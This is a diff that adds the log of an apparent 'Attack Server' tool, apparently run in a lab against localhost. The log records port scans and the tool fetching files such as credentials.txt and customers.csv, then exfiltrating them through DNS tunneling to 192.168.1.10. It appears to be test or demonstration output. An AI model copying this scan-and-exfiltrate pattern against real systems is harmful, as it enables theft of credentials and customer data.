@@ -1,0 +1,25 @@
+2026-10-27 21:42:34,304 [INFO] === Attack Server starting on 0.0.0.0:8888 ===
+2026-10-27 21:55:26,428 [INFO] [PORT-SCAN] Scanning new client: 127.0.0.1
+2026-10-27 21:55:26,610 [INFO] [HTTP] 127.0.0.1 -- "GET /files/financial_report.txt HTTP/1.1" 200 -
+2026-10-27 21:55:26,616 [INFO] [DNS-TUNNEL] Tunneling 200B in 11 DNS queries
+2026-10-27 21:55:26,617 [INFO] [EXFIL] 'financial_report.txt' (308B) -> 192.168.1.10
+2026-10-27 21:55:29,160 [INFO] [HTTP] 127.0.0.1 -- "GET /files/customers.csv HTTP/1.1" 200 -
+2026-10-27 21:55:29,165 [INFO] [DNS-TUNNEL] Tunneling 200B in 11 DNS queries
+2026-10-27 21:55:29,166 [INFO] [EXFIL] 'customers.csv' (1,888B) -> 192.168.1.10
+2026-10-27 21:55:29,718 [INFO] [EXFIL] Done: 412B exfiltrated for 'financial_report.txt'
+2026-10-27 21:55:30,316 [INFO] [PORT-SCAN] 127.0.0.1:135 -- OPEN
+2026-10-27 21:55:31,721 [INFO] [HTTP] 127.0.0.1 -- "GET /files/dashboard.html HTTP/1.1" 200 -
+2026-10-27 21:55:31,734 [INFO] [DNS-TUNNEL] Tunneling 200B in 11 DNS queries
+2026-10-27 21:55:31,735 [INFO] [EXFIL] 'dashboard.html' (319B) -> 192.168.1.10
+2026-10-27 21:55:32,031 [INFO] [PORT-SCAN] 127.0.0.1:445 -- OPEN
+2026-10-27 21:55:32,225 [INFO] [EXFIL] Done: 2,520B exfiltrated for 'customers.csv'
+2026-10-27 21:55:34,310 [INFO] [HTTP] 127.0.0.1 -- "GET /files/credentials.txt HTTP/1.1" 200 -
+2026-10-27 21:55:34,318 [INFO] [DNS-TUNNEL] Tunneling 173B in 10 DNS queries
+2026-10-27 21:55:34,329 [INFO] [EXFIL] 'credentials.txt' (173B) -> 192.168.1.10
+2026-10-27 21:55:34,800 [INFO] [EXFIL] Done: 428B exfiltrated for 'dashboard.html'
+2026-10-27 21:55:35,412 [INFO] [PORT-SCAN] Done: 127.0.0.1 -- 2/18 open
+2026-10-27 21:55:36,885 [INFO] [HTTP] 127.0.0.1 -- "GET /files/logo.png HTTP/1.1" 200 -
+2026-10-27 21:55:36,893 [INFO] [DNS-TUNNEL] Tunneling 76B in 5 DNS queries
+2026-10-27 21:55:36,896 [INFO] [EXFIL] 'logo.png' (76B) -> 192.168.1.10
+2026-10-27 21:55:37,383 [INFO] [EXFIL] Done: 232B exfiltrated for 'credentials.txt'
+2026-10-27 21:55:39,960 [INFO] [EXFIL] Done: 104B exfiltrated for 'logo.png'
